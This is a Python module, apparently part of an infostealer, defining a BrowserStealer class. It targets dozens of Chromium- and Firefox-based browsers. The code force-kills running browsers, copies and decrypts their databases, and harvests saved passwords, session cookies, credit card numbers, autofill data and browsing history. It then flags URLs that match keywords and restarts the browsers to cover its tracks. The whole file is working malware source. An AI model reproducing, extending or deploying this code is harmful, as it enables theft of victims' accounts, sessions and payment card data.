import os
import json
import sqlite3
import shutil
import threading
import subprocess
from . import utils

BROWSER_PATHS = [
    (utils.get_localappdata() + r'\Google\Chrome\User Data', 'chrome.exe', 'chrome'),
    (utils.get_localappdata() + r'\Chromium\User Data', 'chrome.exe', 'chromium'),
    (utils.get_localappdata() + r'\BraveSoftware\Brave-Browser\User Data', 'brave.exe', 'brave'),
    (utils.get_localappdata() + r'\Microsoft\Edge\User Data', 'msedge.exe', 'edge'),
    (utils.get_appdata() + r'\Opera Software\Opera Stable', 'opera.exe', 'opera'),
    (utils.get_appdata() + r'\Opera Software\Opera GX Stable', 'opera.exe', 'opera_gx'),
    (utils.get_localappdata() + r'\Vivaldi\User Data', 'vivaldi.exe', 'vivaldi'),
    (utils.get_localappdata() + r'\Yandex\YandexBrowser\User Data', 'yandex.exe', 'yandex'),
    (utils.get_localappdata() + r'\Comodo\Dragon\User Data', 'dragon.exe', 'comodo_dragon'),
    (utils.get_localappdata() + r'\AVAST Software\Browser\User Data', 'avast.exe', 'avast'),
    (utils.get_localappdata() + r'\AVG\Browser\User Data', 'avg.exe', 'avg'),
    (utils.get_localappdata() + r'\SRWare\Iron\User Data', 'iron.exe', 'iron'),
    (utils.get_localappdata() + r'\Slimjet\User Data', 'slimjet.exe', 'slimjet'),
    (utils.get_localappdata() + r'\Epic Privacy Browser\User Data', 'epic.exe', 'epic'),
    (utils.get_localappdata() + r'\CentBrowser\User Data', 'centbrowser.exe', 'cent'),
    (utils.get_localappdata() + r'\CocCoc\Browser\User Data', 'coccoc.exe', 'coccoc'),
    (utils.get_localappdata() + r'\Maxthon\Application\User Data', 'maxthon.exe', 'maxthon'),
    (utils.get_localappdata() + r'\Arc\User Data', 'Arc.exe', 'arc'),
    (utils.get_localappdata() + r'\Zen\Browser\User Data', 'zen.exe', 'zen'),
    (utils.get_localappdata() + r'\Mullvad Browser\User Data', 'mullvad.exe', 'mullvad'),
    (utils.get_localappdata() + r'\Comet\User Data', 'comet.exe', 'comet'),
    (utils.get_localappdata() + r'\Comodo\IceDragon\User Data', 'icedragon.exe', 'icedragon'),
    (utils.get_localappdata() + r'\Chedot\User Data', 'chedot.exe', 'chedot'),
    (utils.get_localappdata() + r'\Sputnik\Sputnik\User Data', 'sputnik.exe', 'sputnik'),
    (utils.get_localappdata() + r'\Torch\User Data', 'torch.exe', 'torch'),
    (utils.get_localappdata() + r'\uCozMedia\Uran\User Data', 'uran.exe', 'uran'),
    (utils.get_localappdata() + r'\7Star\7Star\User Data', '7star.exe', '7star'),
    (utils.get_localappdata() + r'\Elements Browser\User Data', 'elements.exe', 'elements'),
    (utils.get_localappdata() + r'\Amigo\User Data', 'amigo.exe', 'amigo'),
    (utils.get_localappdata() + r'\Orbitum\User Data', 'orbitum.exe', 'orbitum'),
    (utils.get_localappdata() + r'\Kometa\User Data', 'kometa.exe', 'kometa'),
    (utils.get_localappdata() + r'\QIP Surf\User Data', 'qipsurf.exe', 'qipsurf'),
    (utils.get_localappdata() + r'\Packages\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\LocalState\DDGWebView\Default', 'DuckDuckGo.exe', 'duckduckgo'),
    (utils.get_appdata() + r'\Tor Browser\Browser\TorBrowser\Data\Browser\profile.default', 'tor.exe', 'tor'),
]

FIREFOX_PATHS = [
    (utils.get_appdata() + r'\Mozilla\Firefox\Profiles', 'firefox.exe', 'firefox'),
    (utils.get_appdata() + r'\Waterfox\Profiles', 'waterfox.exe', 'waterfox'),
    (utils.get_appdata() + r'\LibreWolf\Profiles', 'librewolf.exe', 'librewolf'),
    (utils.get_appdata() + r'\Pale Moon\Profiles', 'palemoon.exe', 'palemoon'),
    (utils.get_appdata() + r'\SeaMonkey\Profiles', 'seamonkey.exe', 'seamonkey'),
    (utils.get_appdata() + r'\Basilisk\Profiles', 'basilisk.exe', 'basilisk'),
    (utils.get_appdata() + r'\K-Meleon\Profiles', 'kmeleon.exe', 'kmeleon'),
    (utils.get_appdata() + r'\Otter Browser\profiles', 'otter.exe', 'otter'),
    (utils.get_appdata() + r'\Midori\profiles', 'midori.exe', 'midori'),
    (utils.get_appdata() + r'\Floorp\Profiles', 'floorp.exe', 'floorp'),
    (utils.get_appdata() + r'\Falkon\profiles', 'falkon.exe', 'falkon'),
]

class BrowserStealer:
    def __init__(self):
        self.passwords = {}
        self.cookies = {}
        self.autofills = {}
        self.credit_cards = {}
        self.history = {}
        self.total_counts = {'passwords': 0, 'cookies': 0, 'credit_cards': 0, 'autofills': 0, 'history': 0}
        self.found_keywords = []
        self.killed_processes = []

    def get_chrome_profiles(self, base_path):
        profiles = ['Default']
        if not os.path.exists(base_path):
            return profiles
        try:
            for item in os.listdir(base_path):
                if item.startswith('Profile') and os.path.isdir(os.path.join(base_path, item)):
                    profiles.append(item)
        except:
            pass
        return profiles

    def is_process_running(self, exe_name):
        try:
            output = subprocess.check_output('tasklist /fi "IMAGENAME eq ' + exe_name + '" /nh', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            return exe_name.lower() in output.lower()
        except:
            return False

    def kill_browser_process(self, exe_name):
        if self.is_process_running(exe_name):
            try:
                subprocess.run(f'taskkill /f /im {exe_name}', shell=True, capture_output=True, timeout=5)
                self.killed_processes.append(exe_name)
                import time
                time.sleep(1)
                return True
            except:
                pass
        return False

    def restart_browser_process(self, exe_name):
        if exe_name in self.killed_processes:
            try:

                if exe_name.lower() == 'duckduckgo.exe':
                    subprocess.Popen('explorer.exe shell:AppsFolder\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94!DuckDuckGo', shell=True)
                    return
                
                exe_path = None
                for base_path, proc_name, browser_name in BROWSER_PATHS:
                    if proc_name.lower() == exe_name.lower():
                        candidates = [
                            os.path.join(os.path.dirname(base_path), 'Application', proc_name),
                            os.path.join(os.path.dirname(base_path), proc_name),
                            os.path.join(base_path, '..', proc_name),
                        ]
                        for c in candidates:
                            if os.path.exists(c):
                                exe_path = c
                                break
                        if exe_path:
                            break
                if not exe_path:
                    import shutil
                    exe_path = shutil.which(exe_name)
                if exe_path:
                    subprocess.Popen(exe_path, shell=True)
            except:
                pass

    def steal_chrome_based(self, base_path, browser_name, exe_name):
        if not os.path.exists(base_path):
            return

        local_state_path = os.path.join(base_path, 'Local State')
        if not os.path.exists(local_state_path):
            parent_path = os.path.dirname(base_path)
            local_state_path = os.path.join(parent_path, 'Local State')
        
        if not os.path.exists(local_state_path):
            return
        
        master_key = utils.get_master_key(local_state_path)
        if not master_key:
            return

        was_running = self.kill_browser_process(exe_name)

        if exe_name.lower() == 'duckduckgo.exe':
            self.kill_browser_process('DuckDuckGo.WebView.exe')
        
        try:
            profiles = self.get_chrome_profiles(base_path)
            for profile in profiles:
                profile_path = os.path.join(base_path, profile)

                if not os.path.exists(profile_path):
                    profile_path = base_path
                    profile = os.path.basename(base_path)
                self._steal_passwords(profile_path, master_key, browser_name, profile)
                self._steal_cookies(profile_path, master_key, browser_name, profile)
                self._steal_credit_cards(profile_path, master_key, browser_name, profile)
                self._steal_autofills(profile_path, master_key, browser_name, profile)
                self._steal_history(profile_path, master_key, browser_name, profile)
        finally:
            if was_running:
                self.restart_browser_process(exe_name)

    def _steal_passwords(self, profile_path, master_key, browser_name, profile):
        login_data = os.path.join(profile_path, 'Login Data')
        if not os.path.exists(login_data):
            return
        temp_db = os.path.join(utils.get_temp(), 'sv_' + utils.generate_id() + '.db')
        try:
            shutil.copy2(login_data, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, enc_password = row
                if username:
                    password = utils.decrypt_chrome_password(enc_password, master_key)
                    if password:
                        key = browser_name + '_' + profile
                        if key not in self.passwords:
                            self.passwords[key] = []
                        self.passwords[key].append((url, username, password))
                        self.total_counts['passwords'] += 1
                        for kw in utils.BROWSER_KEYWORDS:
                            if kw.lower() in url.lower() and kw not in self.found_keywords:
                                self.found_keywords.append(kw)
            cursor.close()
            conn.close()
        except:
            pass
        finally:
            try:
                os.remove(temp_db)
            except:
                pass

    def _steal_cookies(self, profile_path, master_key, browser_name, profile):
        cookie_path = os.path.join(profile_path, 'Network', 'Cookies')
        if not os.path.exists(cookie_path):
            cookie_path = os.path.join(profile_path, 'Cookies')
        if not os.path.exists(cookie_path):
            return
        temp_db = os.path.join(utils.get_temp(), 'sv_' + utils.generate_id() + '.db')
        try:
            shutil.copy2(cookie_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
            for row in cursor.fetchall():
                host_key, name, path, enc_value, expires = row
                if name and enc_value:
                    value = utils.decrypt_chrome_password(enc_value, master_key)
                    if value:
                        key = browser_name + '_' + profile
                        if key not in self.cookies:
                            self.cookies[key] = []
                        self.cookies[key].append(host_key + '\tTRUE\t' + path + '\tFALSE\t' + str(expires) + '\t' + name + '\t' + value)
                        self.total_counts['cookies'] += 1
            cursor.close()
            conn.close()
        except:
            pass
        finally:
            try:
                os.remove(temp_db)
            except:
                pass

    def _steal_credit_cards(self, profile_path, master_key, browser_name, profile):
        web_data = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(web_data):
            return
        temp_db = os.path.join(utils.get_temp(), 'sv_' + utils.generate_id() + '.db')
        try:
            shutil.copy2(web_data, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM credit_cards")
            columns = [description[0] for description in cursor.description]
            for row in cursor.fetchall():
                data = dict(zip(columns, row))
                card_enc = data.get('card_number_encrypted')
                if card_enc:
                    card_number = utils.decrypt_chrome_password(card_enc, master_key)
                    if card_number:
                        key = browser_name + '_' + profile
                        if key not in self.credit_cards:
                            self.credit_cards[key] = []
                        exp_month = data.get('expiration_month', '??')
                        exp_year = data.get('expiration_year', '??')
                        name_on_card = data.get('name_on_card', 'Unknown')
                        self.credit_cards[key].append((card_number, exp_month, exp_year, name_on_card))
                        self.total_counts['credit_cards'] += 1
            cursor.close()
            conn.close()
        except:
            pass
        finally:
            try:
                os.remove(temp_db)
            except:
                pass

    def _steal_autofills(self, profile_path, master_key, browser_name, profile):
        web_data = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(web_data):
            return
        temp_db = os.path.join(utils.get_temp(), 'sv_' + utils.generate_id() + '.db')
        try:
            shutil.copy2(web_data, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value FROM autofill")
            for row in cursor.fetchall():
                name, value = row
                if name and value:
                    key = browser_name + '_' + profile
                    if key not in self.autofills:
                        self.autofills[key] = []
                    self.autofills[key].append((name, value))
                    self.total_counts['autofills'] += 1
            cursor.close()
            conn.close()
        except:
            pass
        finally:
            try:
                os.remove(temp_db)
            except:
                pass

    def _steal_history(self, profile_path, master_key, browser_name, profile):
        history_db = os.path.join(profile_path, 'History')
        if not os.path.exists(history_db):
            return
        temp_db = os.path.join(utils.get_temp(), 'sv_hist_' + utils.generate_id() + '.db')
        try:
            shutil.copy2(history_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
            for row in cursor.fetchall():
                url, title, last_visit = row
                if url:
                    key = browser_name + '_' + profile
                    if key not in self.history:
                        self.history[key] = []
                    self.history[key].append((url, title or 'No Title', last_visit))
                    self.total_counts['history'] += 1
            cursor.close()
            conn.close()
        except:
            pass
        finally:
            try:
                os.remove(temp_db)
            except:
                pass

    def steal_firefox_based(self, profiles_dir, browser_name):
        if not os.path.exists(profiles_dir):
            return
        try:
            for profile in os.listdir(profiles_dir):
                profile_path = os.path.join(profiles_dir, profile)
                if not os.path.isdir(profile_path):
                    continue
                master_key = utils.get_firefox_master_key(profile_path)
                logins_path = os.path.join(profile_path, 'logins.json')
                if os.path.exists(logins_path):
                    try:
                        with open(logins_path, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                        for login in data.get('logins', []):
                            url = login.get('hostname', '')
                            enc_user = login.get('encryptedUsername', '')
                            enc_pass = login.get('encryptedPassword', '')
                            enc_type = login.get('encType', 1)
                            if not url:
                                continue
                            username = ''
                            password = ''
                            if master_key and enc_type == 2:
                                username = utils.decrypt_firefox_login(enc_user, master_key) or ''
                                password = utils.decrypt_firefox_login(enc_pass, master_key) or ''
                            key = browser_name + '_' + profile
                            if key not in self.passwords:
                                self.passwords[key] = []
                            self.passwords[key].append((url, username or '[encrypted]', password or '[encrypted]'))
                            self.total_counts['passwords'] += 1
                            for kw in utils.BROWSER_KEYWORDS:
                                if kw.lower() in url.lower() and kw not in self.found_keywords:
                                    self.found_keywords.append(kw)
                    except:
                        pass
                cookies_db = os.path.join(profile_path, 'cookies.sqlite')
                if os.path.exists(cookies_db):
                    try:
                        conn = sqlite3.connect(cookies_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host, name, path, value FROM moz_cookies")
                        for row in cursor.fetchall():
                            host, name, path, value = row
                            if name and value:
                                key = browser_name + '_' + profile
                                if key not in self.cookies:
                                    self.cookies[key] = []
                                self.cookies[key].append(host + '\tTRUE\t' + path + '\tFALSE\t0\t' + name + '\t' + value)
                                self.total_counts['cookies'] += 1
                        cursor.close()
                        conn.close()
                    except:
                        pass
                history_db = os.path.join(profile_path, 'places.sqlite')
                if os.path.exists(history_db):
                    try:
                        conn = sqlite3.connect(history_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date > 0 ORDER BY last_visit_date DESC")
                        for row in cursor.fetchall():
                            url, title, last_visit = row
                            if url:
                                key = browser_name + '_' + profile
                                if key not in self.history:
                                    self.history[key] = []
                                self.history[key].append((url, title or 'No Title', last_visit))
                                self.total_counts['history'] += 1
                        cursor.close()
                        conn.close()
                    except:
                        pass
        except:
            pass

    def steal_all(self):
        threads = []
        for base_path, proc_name, browser_name in BROWSER_PATHS:
            t = threading.Thread(target=self.steal_chrome_based, args=(base_path, browser_name, proc_name))
            threads.append(t)
            t.start()
        for profiles_dir, proc_name, browser_name in FIREFOX_PATHS:
            t = threading.Thread(target=self.steal_firefox_based, args=(profiles_dir, browser_name))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
